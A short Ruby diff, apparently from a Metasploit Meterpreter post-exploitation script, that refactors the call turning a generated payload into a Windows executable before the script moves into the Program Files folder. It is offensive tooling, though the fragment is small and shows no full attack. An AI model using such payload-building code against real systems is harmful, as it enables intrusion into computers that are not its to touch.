@@ -66,7 +66,10 @@ elsif client.platform =~ /win32|win64/
 			pay.datastore['LPORT'] = rport
 			raw  = pay.generate
 
-			exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
+			exe = Msf::Util::EXE.to_win32pe(
+          code: raw,
+          framework: client.framework
+      )
 
 			# Change to our working directory.
 			workingdir = client.fs.file.expand_path("%ProgramFiles%")
